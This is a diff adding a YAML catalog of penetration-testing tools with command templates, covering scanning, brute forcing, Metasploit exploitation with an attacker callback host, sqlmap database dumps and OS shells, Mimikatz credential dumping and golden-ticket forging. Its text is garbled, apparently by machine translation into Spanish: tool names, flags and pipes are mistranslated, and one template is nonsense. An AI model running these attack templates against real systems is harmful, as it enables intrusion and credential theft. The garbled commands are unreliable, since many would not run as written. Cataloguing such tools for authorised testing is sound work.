@@ -1,0 +1,233 @@
+# Security Tools Catalog
+# Organized by category with command templates
+# Version: 1.0.0
+
+catalog:
+  version: "1.0.0"
+  last_updated: "2026-03-05"
+  ethical_notice: "Todas las herramientas deben utilizarse dentro del ámbito autorizado solamente" 
+
+categories:
+  reconnaissance:
+    description: "Búsqueda de redes, escaneo portuario, identificación de servicios" 
+    tools:
+      nmap:
+        purpose: "Mapper de red — escaneo portuario, detección de servicios, huella de OS" 
+        install: "apt install nmap / cervecería instalar nmap" 
+        templates:
+          quick_scan: "nmap -sV -sC -T4 {target}" 
+          full_tcp: "nmap -sV -sC -p- -T4 {target} - OA nmap_full" 
+          stealth_scan: "nmap -sS -T2 -f ...data-length 24 {target}" 
+          udp_top: "Nmap -sU...top-ports 100-T4 {target}" 
+          os_detect: "nmap-O-sV {target}" 
+          vuln_scripts: "nmap --script vuln -sV {target}" 
+          subnet_sweep: "nmap -sn {target}/24 -oG alive_hosts.txt" 
+      masscan:
+        purpose: "Escáner de puerto de alta velocidad para grandes rangos" 
+        install: "apt install masscan / cervecería instalar masscan" 
+        templates:
+          full_range: "masacan {target}/24 -p1-65535 -rate=1000 -oL masscan_output.txt" 
+          top_ports: "masacan {target} -p80,443,8080,8443,22,21,25,53 --rate=500" 
+      shodan:
+        purpose: "Motor de búsqueda de dispositivos conectados a Internet (pasivo)" 
+        install: "pip install shodan" 
+        templates:
+          host_lookup: "Shodan host {ip}" 
+          search: "búsqueda de shodan{query}'" 
+          domain_info: "dominio shodan {domain}" 
+      amass:
+        purpose: "enumeración de subdominios y cartografía de red" 
+        install: "Ve a instalar github.com/owasp-amass/amass/v4/...@master" 
+        templates:
+          passive: "amasa enum -passive -d {domain} -o subdominios.txt" 
+          active: "amasa enum -active -d {domain} -o subdominios.txt" 
+      subfinder:
+        purpose: "Rápido descubrimiento pasivo subdominio" 
+        install: "Ve a instalar github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest" 
+        templates:
+          basic: "subfinder -d {domain} -o subdominios.txt" 
+          recursive: "subfinder -d {domain} -recursivo -o subdominios.txt" 
+
+  enumeration:
+    description: "Directorio brute-forcing, descubrimiento de vhost, enumeración de contenido" 
+    tools:
+      gobuster:
+        purpose: "Directorio y DNS brute-forcing" 
+        install: "Ve a instalar github.com/OJ/gobuster/v3@latest" 
+        templates:
+          dir_scan: "gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt - 50" 
+          dns_enum: "gobuster dns -d {domain} -w/usr/share/wordlists/subdomains.txt - 50" 
+          vhost: "gobuster vhost -u {url} -w /usr/share/wordlists/vhosts.txt" 
+          extensions: "gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -x php,asp,aspx,jsp,html,js,txt,bak" 
+      ffuf:
+        purpose: "Fuzzer web rápido para directorios, parámetros y vhosts" 
+        install: "Ve a instalar github.com/ffuf/ffuf/v2@latest" 
+        templates:
+          dir_fuzz: "ffuf -u {url}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403" 
+          param_fuzz: "ffuf -u '{url}FUZZ=test' -w /usr/share/wordlists/params.txt -mc 200" 
+          vhost_fuzz: "ffuf -u {url} -H 'Host: FUZZ.{domain}-w /usr/share/wordlists/subdomains.txt -mc 200" 
+      dirbuster:
+        purpose: "Directorio web multi-threaded brute-forcer (GUI + CLI)" 
+        install: "apt install dirbuster" 
+        templates:
+          basic: "dirb {url} /usr/share/wordlists/dirb/common.txt"
+          recursive: "dirb {url} /usr/share/wordlists/dirb/common.txt -r" 
+      feroxbuster:
+        purpose: "Descubrimiento rápido de contenido recursivo" 
+        install: "instalación de feroxbuster" 
+        templates:
+          recursive: "feroxbuster -u {url} -w /usr/share/wordlists/dirb/common.txt - A fondo 3" 
+
+  vulnerability_scanning:
+    description: "Detección y evaluación de la vulnerabilidad automatizada" 
+    tools:
+      nikto:
+        purpose: "Escáner de vulnerabilidad del servidor web" 
+        install: "apt install nikto" 
+        templates:
+          basic: "Nikto-h {url} - el nikto_report.html -Format htm" 
+          tuned: "Nikto -h {url} -Tuning 1234567890 -o nikto_full.txt" 
+      nuclei:
+        purpose: "Escáner de vulnerabilidad basado en la plantilla" 
+        install: "Ve a instalar github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest" 
+        templates:
+          basic: "nuclei -u {url} - toda la vida crítica, alta" 
+          full: "nuclei -u {url} - toda la vida crítica, alta, media -o nuclei_results.txt" 
+          cves: "nuclei -u {url} -tags cve - la perseverancia crítica, alta" 
+          tech_detect: "nuclei -u {url} -tags tech" 
+      burp_suite:
+        purpose: "Plataforma de pruebas de seguridad de aplicaciones web" 
+        install: "Descarga desde portswigger.net" 
+        templates:
+          note: "GUI-basado en el uso para pruebas manuales, intercepción proxy, escáner" 
+      openvas:
+        purpose: "Sistema de evaluación de la vulnerabilidad de código abierto" 
+        install: "apt install openvas" 
+        templates:
+          basic: "gvm-cli Enchufe...gmp-username admin --gmp-password admin --xml 'Secreate_task>...</create_task>'" 
+
+  exploitation:
+    description: "Marcos de explotación y herramientas de ataque" 
+    tools:
+      metasploit:
+        purpose: "Marco de pruebas de penetración — exploit, payload, post-exploitation" 
+        install: "curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall Silencio" 
+        templates:
+          search: "msfconsole -q -x 'search {cve}; salida" 
+          exploit: "msfconsole -q -x 'use {module}; set RHOSTS {target}; set LHOST {attacker}; explotar; salir" 
+          db_init: "msfdb init &quot; , pmsfconsole -q" 
+      sqlmap:
+        purpose: "Detección y explotación de inyección SQL automatizada" 
+        install: "pip install sqlmap" 
+        templates:
+          basic: "sqlmap -u '{url}*id=1' --batch --risk=2 --level=3" 
+          forms: "sqlmap -u '{url}\"...formas... bárbaro... arruinó\"" 
+          dump: "sqlmap -u '{url}#id=1' --batch --dump --threads=5" 
+          os_shell: "sqlmap -u '{url}¿Qué?os-shell - ¡Bolsa!" 
+      hydra:
+        purpose: "Acceso a la red brute-forcer" 
+        install: "apt install hydra" 
+        templates:
+          ssh: "hidrata -l {user} -P /usr/share/wordlists/rockyou.txt ssh://{target}" 
+          web_form: "hidrata -l {user} -P /usr/share/wordlists/rockyou.txt {target} http-post-form '{path}:{params}:{failure_string}'" 
+
+  post_exploitation:
+    description: "Escalada de privilege, movimiento lateral, cosecha credencial" 
+    tools:
+      mimikatz:
+        purpose: "Extracción credencial de Windows (post-exploitation)" 
+        install: "Descarga desde GitHub (requiere Windows o Vino)" 
+        templates:
+          dump_creds: "mimikatz # privilegio::debug sekurlsa::logonpasswords" 
+          dump_hashes: "# Voy a ser el que va a ser el que va a ser el que va a ser el único #" 
+          golden_ticket: "mimikatz # kerberos:golden /user:{user} /domain:{domain} /sid:{sid} /krbtgt:{hash}" 
+      bloodhound:
+        purpose: "Análisis de la ruta de ataque Active Directory" 
+        install: "apt install bloodhound" 
+        templates:
+          collect: "bloodhound-python -u {user} -p {pass} -d {domain} -c All" 
+          ingest: "Cargue archivos JSON a BloodHound GUI" 
+      linpeas:
+        purpose: "Lista de aumento de privilegios de Linux" 
+        install: "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh" 
+        templates:
+          basic: "chmod +x linpeas.sh && ./linpeas.sh -a confidencialidad tee linpeas_output.txt" 
+      winpeas:
+        purpose: "Lista de aumento de privilegios de Windows" 
+        install: "Descarga de las versiones de GitHub" 
+        templates:
+          basic: "winPEASx64.exe Silencio tee winpeas_output.txt" 
+
+  defense:
+    description: "Monitoreo de redes, detección de intrusiones, análisis de tráfico" 
+    tools:
+      snort:
+        purpose: "Sistema de detección y prevención de intrusiones en red" 
+        install: "apt install snort" 
+        templates:
+          monitor: "snort - Una consola -q -c /etc/snort/snort.conf -i {interface}" 
+          log: "snort -dev -l /var/log/snort -i {interface}" 
+      suricata:
+        purpose: "Alto rendimiento IDS/IPS y vigilancia de la seguridad en las redes" 
+        install: "apt install suricata" 
+        templates:
+          live: "suricata -c /etc/suricata/suricata.yaml -i {interface}" 
+          pcap: "suricata -c /etc/suricata/suricata.yaml -r {pcap_file}" 
+      wireshark:
+        purpose: "Analizador de protocolo de red y captura de paquetes" 
+        install: "apt install wireshark / cervece instalar cableshark" 
+        templates:
+          capture: "tshark -i {interface} -w capture.pcap" 
+          filter: "tshark -r capture.pcap -Y{display_filter}'" 
+          http: "tshark -i {interface} -Y 'http.request' -T fields -e http.host -e http.request.uri" 
+      fail2ban:
+        purpose: "Prevención de la intrusión — prohibió la IP después de fracasados intentos de austeridad" 
+        install: "apt install fail2ban" 
+        templates:
+          status: "estado de fracaso2ban-client" 
+          jail_status: "estado de fracaso2ban-client {jail}" 
+          ban_ip: "set fail2ban-client {jail} banip {ip}" 
+
+  osint:
+    description: "Reunión de inteligencia de código abierto" 
+    tools:
+      theHarvester:
+        purpose: "Correo electrónico, subdominio y cosecha de nombre" 
+        install: "pip instalar elHarvester" 
+        templates:
+          basic: "elHarvester -d {domain} -b all -l 500" 
+          specific: "elHarvester -d {domain} -b google,bing,linkedin -l 200" 
+      recon_ng:
+        purpose: "Marco de reconocimiento web" 
+        install: "pip install recon-ng" 
+        templates:
+          basic: "recon-ng -w {workspace}"
+      spiderfoot:
+        purpose: "Automatización de la colección OSINT" 
+        install: "pip instala el pie de la pipa" 
+        templates:
+          scan: "sf -s {target} - No DOMAIN_NAME -m sfp_dnsresolve,sfp_whois" 
+
+  crypto_analysis:
+    description: "Criterios de contraseña y análisis criptográfico" 
+    tools:
+      hashcat:
+        purpose: "Recuperación de contraseñas avanzadas" 
+        install: "apt install hashcat" 
+        templates:
+          dictionary: "hashcat -m {hash_type} {hashfile} /usr/share/wordlists/rockyou.txt" 
+          rules: "hashcat -m {hash_type} {hashfile} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule" 
+          brute: "hashcat -m {hash_type} {hashfile} - ¿3 'a?a?a?a?a?a?a?a?a" 
+      john:
+        purpose: "grieta de contraseña (John el Destripador)" 
+        install: "apt install john" 
+        templates:
+          basic: "John. {hashfile} --wordlist=/usr/share/wordlists/rockyou.txt" 
+          show: "John. {hashfile} - ¿Qué?" 
+          rules: "John. {hashfile} --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64" 
+      testssl:
+        purpose: "SSL/TLS Pruebas de configuración" 
+        install: "git clone https://github.com/drwetter/testssl.sh.git" 
+        templates:
+          basic: "testssl.sh {target}:443"
+          full: "testssl.sh --full {target}:443"
